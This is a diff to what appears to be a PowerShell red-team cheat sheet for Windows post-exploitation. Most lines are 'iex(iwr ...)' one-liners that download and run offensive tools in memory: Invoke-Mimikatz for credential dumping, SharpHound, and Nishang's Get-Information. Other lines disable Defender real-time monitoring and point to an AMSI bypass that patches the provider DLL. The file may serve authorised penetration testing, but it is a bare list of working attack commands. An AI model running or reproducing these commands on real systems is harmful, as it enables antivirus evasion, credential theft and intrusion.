@@ -1,4 +1,4 @@
-Set-MPPreference -DisableRealtimeMonitoring $true
+# Set-MPPreference -DisableRealtimeMonitoring $true
 
 ############# admin privs required
 iex( iwr https://raw.githubusercontent.com/EmpireProject/Empire/7efb7eeaabeb3daf916ead7856bb621bbca331f4/data/module_source/credentials/Invoke-Mimikatz.ps1 -usebasicparsing); Invoke-Mimikatz
@@ -25,6 +25,4 @@ iex( iwr https://github.com/BloodHoundAD/BloodHound/raw/master/Collectors/SharpH
 iex( iwr https://raw.githubusercontent.com/samratashok/nishang/0090ba2e51b7503c3245081894c0fc87b696f941/Gather/Get-Information.ps1 -usebasicparsing); Get-Information -ErrorAction SilentlyContinue
 
 # amsi bypass
-https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell (Copy First Method: Patch the providers DLL)
-Set-MPPreference -DisableRealtimeMonitoring $false
-#Invoke-Mimikatz
+# Visit https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell and copy the code for the first bypass method "Patch the providers DLL"
